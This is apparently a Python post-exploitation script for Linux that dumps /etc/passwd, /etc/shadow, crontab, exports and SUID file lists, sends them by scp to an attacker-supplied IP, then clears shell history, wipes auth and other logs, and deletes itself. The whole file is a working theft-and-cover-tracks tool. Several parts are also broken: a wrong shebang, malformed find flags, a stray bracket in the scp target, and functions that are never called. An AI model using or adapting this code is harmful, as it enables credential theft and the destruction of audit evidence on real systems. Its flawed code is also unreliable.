#!/usr/env/python3
# author: suffs811 github: https://github.com/cysec11/scripts
# python script for catting /etc files, saving them to file,
# sending them to local system,
# and deleting history/script from target machine.

import os


def extract_clear():
    # confirm user wants to permanently delete logs and alter bach environment variables
    print("this script will permanently delete logs and alter bash envs...")
    print("are you sure you want to continue?")
    answer = input("(yes/no): ")

    if answer == "no":
        exit()
    elif answer == "yes":
        # get local machine ip
        local_path = input("local IP and file save path (10.0.0.1/home/file.txt): ")

        # disabling history
        print("disabling history logging...")
        os.system("unset HISTFILE")
        os.system("export HISTSIZE=0")
        os.system("export HISTFILESIZE=0")
        os.system("export HISTFILE=/dev/null")
        os.system("set +o history")

        # create file to write data to
        os.system("cd /tmp/&&mkdir .data&&cd .data&&touch data_exfil.txt")

        # write data to file
        print("exfiltrating data...")
        print("/etc/passwd:")
        os.system("cat /etc/passwd > /tmp/data_exfil.txt")
        os.system("cat /etc/passwd")

        print("/etc/crontab:")
        os.system("cat /etc/crontab >> /tmp/data_exfil.txt")
        os.system("cat /etc/crontab")

        print("/etc/shadow:")
        os.system("cat /etc/shadow >> /tmp/data_exfil.txt")
        os.system("cat /etc/shadow")

        print("/etc/exports:")
        os.system("cat /etc/exports >> /tmp/data_exfil.txt")
        os.system("cat /etc/exports")

        print("SUID files:")
        os.system("find / type -f perm /4000 2>/dev/null >> /tmp/data_exfil.txt")
        os.system("find / type -f perm /4000 2>/dev/null")

        print("if you know the user's passwd, try sudo -l")

        # exfil the data file to local machine
        os.system(f"scp /tmp/data_exfil.txt root@{local_path}]")
        print(f"data_exfil.txt sent to {local_path}")

        # delete logs and this script from target machine
        print("data exfiltrated... clearing log files")
        os.system("echo ' ' > ~/.bash_history")
        os.system("echo ' ' > /var/log/auth.log")
        os.system("echo ' ' > /var/log/cron.log")
        os.system("echo ' ' > /var/log/maillog")
        os.system("echo ' ' > /var/log/httpd")
        os.system("history -c")
        os.system("history -w")
    else:
        print("didn't write yes or no!!!")
        extract_clear()


def delete_file():
    print("do you want to delete the data file and this script?")
    answer_2 = input("(yes/no): ")
    if answer_2 == "no":
        print("good luck!")
        exit()
    elif answer_2 == "yes":
        print("deleting data file and script...")
        os.system("rm -rf /tmp/.data")
        os.system("rm exfil.py")
    else:
        print("didn't write yes or no!!!")
        delete_file()
